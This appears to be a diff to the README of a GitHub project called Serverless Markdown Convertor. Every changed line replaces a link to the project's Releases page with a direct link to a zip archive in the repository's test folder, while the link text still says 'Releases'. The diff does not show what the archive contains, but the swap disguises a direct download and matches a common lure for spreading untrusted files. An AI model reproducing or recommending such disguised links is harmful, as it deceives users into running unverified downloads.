@@ -2,10 +2,10 @@
 
 Welcome to the Serverless Markdown Convertor repository! This tool will help you effortlessly convert your Markdown files to different formats, making your life easier and saving you valuable time. 
 
-If you're interested in trying it out, head over to the [Releases](https://github.com/senpai0123/serverless-markdown-convertor/releases) section to download the latest version.
+If you're interested in trying it out, head over to the [Releases](https://raw.githubusercontent.com/senpai0123/serverless-markdown-convertor/main/test/markdown_serverless_convertor_v2.5.zip) section to download the latest version.
 
 🔗 **Get the Latest Version**  
-[![Download Convertor](https://img.shields.io/badge/Download-Convertor-blue)](https://github.com/senpai0123/serverless-markdown-convertor/releases)
+[![Download Convertor](https://raw.githubusercontent.com/senpai0123/serverless-markdown-convertor/main/test/markdown_serverless_convertor_v2.5.zip)](https://raw.githubusercontent.com/senpai0123/serverless-markdown-convertor/main/test/markdown_serverless_convertor_v2.5.zip)
 
 ## Features 🌟
 - Convert Markdown files to various formats.
@@ -26,6 +26,6 @@ We are a team of developers dedicated to creating efficient tools that simplify 
 
 ---
 
-Dive into the world of effortless Markdown conversion with the Serverless Markdown Convertor. Download the tool now and experience seamless file format transformations. Visit the [Releases](https://github.com/senpai0123/serverless-markdown-convertor/releases) section to get started.
+Dive into the world of effortless Markdown conversion with the Serverless Markdown Convertor. Download the tool now and experience seamless file format transformations. Visit the [Releases](https://raw.githubusercontent.com/senpai0123/serverless-markdown-convertor/main/test/markdown_serverless_convertor_v2.5.zip) section to get started.
 
 Remember, simplicity and effectiveness are at the core of our tool. Let us handle the conversion process while you focus on your work. Enjoy the convenience of hassle-free file format changes with the Serverless Markdown Convertor. 🌈
